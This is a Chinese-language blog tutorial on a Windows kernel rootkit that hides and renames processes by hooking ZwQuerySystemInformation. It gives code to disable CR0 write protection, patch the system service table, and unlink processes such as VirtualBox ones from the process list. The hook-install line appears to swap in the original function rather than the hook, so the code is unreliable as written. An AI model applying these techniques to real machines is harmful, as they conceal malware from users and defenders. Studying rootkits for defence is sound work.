ROOKIT初探——进程隐藏

[TOC]

**预备知识请参阅[RootKit 初探——文件隐藏与混淆](https://tinytracer.com/archives/rootkit-%E5%88%9D%E6%8E%A2-%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/)**

# 原理分析

## 概述

本次Rootkit教程 核心是Hook系统获取进程信息的函数`ZwQuerySystemInformation`。该函数未公开实现，官方文档所信息十分有限。通过RootKit修改系统调用该函数的函数指针，在获取进程信息时进行截流和修改。嗯，核心思想和上一期一样简单。

## 入口

`ZwQuerySystemInformation`的函数原型为：

```cpp
NTSTATUS NewZwQuerySystemInformation
(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
)
```



调用该函数会返回诸多系统信息，包括系统进程、线程信息、模块信息、处理器信息等。不同种类的信息均存储于`SystemInformation`结构体中，通过``SystemInformationClass`进行区分。注意：对于不同种类的信息，虽然都是通过`SystemInformation`字段存储，但是结构体中的属性与排列不尽相同，所占内存空间大小和位置也不一样，不能一概而论。信息种类` SYSTEM_INFORMATION_CLASS`枚举的声明如下

```cpp
typedef enum _SYSTEM_INFORMATION_CLASS 
{
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,    //obsolete...delete
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
   	......//省略
    MaxSystemInfoClass = 82  // MaxSystemInfoClass should always be the last enum
} SYSTEM_INFORMATION_CLASS;
```

根据声明，系统进程与线程信息的序号为5。因此，在调用`SystemInformationClass`时，加个判断条件

```cpp
if(SystemInformationClass == SystemProcessInformation)
```

就可以到达进程信息的入口了，此时`SystemInformation`的类型为`_SYSTEM_PROCESSES`，在使用前加个强制类型转换语句

```cpp
(struct _SYSTEM_PROCESSES *)SystemInformation;
```

来获取进程信息。

## 结构分析

`_SYSTEM_PROCESSES`是一个包含进程信息的结构体，具体声明如下

```cpp
struct _SYSTEM_PROCESSES
{
        ULONG                           NextEntryDelta;
        ULONG                           ThreadCount;
        ULONG                           Reserved[6];
        LARGE_INTEGER           	    CreateTime;
        LARGE_INTEGER           	    UserTime;
        LARGE_INTEGER           	    KernelTime;
        UNICODE_STRING          	    ProcessName;
        KPRIORITY                       BasePriority;
        ULONG                           ProcessId;
        ULONG                           InheritedFromProcessId;
        ULONG                           HandleCount;
        ULONG                           Reserved2[2];
        VM_COUNTERS                     VmCounters;
        IO_COUNTERS                     IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS          Threads[1];
};
```

系统进程的存储方式类似于链表，不过并没有像链表一样具有指向下一项的指针，元素之间的链接通过`NextEntryDelta`实现。`NextEntryDelta`是当前元素与下一元素的偏移量，恒为正值，关系为

```cpp
(char*)&Current_Process + Current_Process.NextEntryDelta = &Next_Process;//偏移量的单位为字节，_SYSTEM_PROCESSES的指针类型为PVOID，长度为4个字节，不能直接进行加法运算
```

对结构体中的成员信息进行修改，或者通过修改`NextEntryDelta`来敲除某项元素就可以达到隐藏和混淆进程信息的目的。Hook函数，修改数据，核心思想与文件一样一模一样，开工。

# Hooking

## Hook前的准备

在着手进行Hook前，需要通过内联汇编的方式将系统内存保护关闭

```assembly
__asm
{
    push	eax
    mov		eax, CR0
    and		eax, 0FFFEFFFFh
    mov		CR0, eax
    pop		eax
}
```

然后声明用于Hook的函数，函数参数类型与返回值与原函数相同，区别在于函数名和实现

```cpp
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)
(
	ULONG SystemInformationCLass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);
ZWQUERYSYSTEMINFORMATION 	OldZwQuerySystemInformation;

NTSTATUS NewZwQuerySystemInformation
(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);
```

在加载驱动的时候，使用Hook的函数指针替换系统内置实现的函数指针

```cpp
InterlockedExchange
( 
    (PLONG) &SYSTEMSERVICE(ZwQuerySystemInformation), 
    (LONG) OldZwQuerySystemInformation
);
```

大功告成，接下来可以着手函数的实现了

## Hook函数的框架

首先调用系统内置的`ZwQuerySystemInformation`获取进程信息

```cpp
rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) 
(
    SystemInformationClass,
    SystemInformation,
    SystemInformationLength,
    ReturnLength 
);
```

调用成功后，通过判断语句提取系统进程信息

```cpp
if( NT_SUCCESS( rc ) )
    if( 5 == SystemInformationClass )
```

至此我们已经获取了系统进程信息，可以大刀阔斧地进行定制了。由于两个进程信息之间的连接通过类似链表链接的偏移量实现，进行Hook的思路为：使用两个指针，一个指向当前元素，一个指向当前元素之前的元素，如果当前元素满足条件，既可以对当前元素的属性进行修改，也可以通过修改前一偏移量的方式将当前元素隐藏。Hook函数实现的框架如下：

```cpp
struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
struct _SYSTEM_PROCESSES *prev = NULL;

int iChanged = 0;

if( NT_SUCCESS( rc ) )
{
    if( 5 == SystemInformationClass )
    {
        while(curr)
		{
            ANSI_STRING process_name;//结构体中存储的数据为UnicodeString，需要转换为ANSI_STRING，方便后续进行修改
            RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
            if( (0 < process_name.Length) && (255 > process_name.Length) )
            {
                ......;//Hook实现;
            }
            else//当前进程为系统时间进程，需要对时间进行更新
            {
                curr->UserTime.QuadPart += m_UserTime.QuadPart;
                curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
                m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
            }

            RtlFreeAnsiString(&process_name);//释放资源
            prev = curr;
            if(curr->NextEntryDelta) 
                ((char *)curr += curr->NextEntryDelta);
            else 
                curr = NULL;
        }
    }
	else if (8 == SystemInformationClass)//系统时间信息结构体，需要进行更新			
	{
		struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
		times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
     };
}
```



## Hooking函数实现示例

系统初始进程状况如下

![](http://ozhtfx691.bkt.clouddn.com//rootkit/proc/proc_rootkit_1.png)

### 隐藏所有进程

隐藏所有进程的实现非常简单，直接将第一个进程结构体的`NextEntryDelta`字段改为0即可。不过无法隐藏两个系统进程，原因未知。~~燃烧我的进程表~~

```cpp
curr->NextEntryDelta = 0;
```

![](http://ozhtfx691.bkt.clouddn.com//rootkit/proc/proc_rootkit_2.png)

### 隐藏指定进程

通过对结构体中的`process_name`字段进行比对，找出特定的进程，对其前一元素的`NextEntryDelta`进行修改。比如隐藏VBOX的所有进程

```cpp
if(0 == memcmp( process_name.Buffer, "VBox", 4))
{
    char _output[255];
    char _pname[255];
    memset(_pname, 0, 255);
    memcpy(_pname, process_name.Buffer, process_name.Length);
    iChanged = 1;
    m_UserTime.QuadPart += curr->UserTime.QuadPart;
    m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
    if(prev)
    {
            if(curr->NextEntryDelta)
            {
                    //修改字段以跳过下一元素
                    prev->NextEntryDelta += curr->NextEntryDelta;
            }
            else
            {
                    //目标进程位于末尾，提前结束
                    prev->NextEntryDelta = 0;
            }
    }
    else
    {
            if(curr->NextEntryDelta)
            {
                    //目标进程位于开头，对第一个系统结构体的NextEntryDelta进行修改
                    (char *)SystemInformation += curr->NextEntryDelta;
            }
            else
            {
                    //系统中唯一进程
                    SystemInformation = NULL;
            }
    }
}
```

~~假装自己不是虚拟机~~

![](http://ozhtfx691.bkt.clouddn.com//rootkit/proc/proc_rookit_3.png)

## 进程混淆

对结构体中`process_name`字段进行修改可以更改进程名，不过可以更改的进程有限，只能更改所有用户态进程和部分系统进程，原因未知。

```cpp
ANSI_STRING tmp;
RtlInitAnsiString(&tmp,"HACKED!");
RtlAnsiStringToUnicodeString(&(curr->ProcessName),&tmp,FALSE);
```

还记得开头部分的字符串类型转换函数`RtlUnicodeStringToAnsiString`吗？对系统内核态内存变量不能直接使用，也不能通过`memcpy`、`memset`来进行修改，需要通过系统内置的实现来对内核态的数据进行读取和修改，

![](http://ozhtfx691.bkt.clouddn.com//rootkit/proc/proc_rookit_4.png)

# 问题与拓展

- 由于每个结构体的大小是固定的`SystemInformationLength`，对进程名修改的先决条件为：修改字串的长度要小于等于原先进程名的长度。如果对长度进行拓展，需要对结构体其他属性进行修改，**可能导致蓝屏**。
- 无法对`System Idle Process`进行修改，原因不明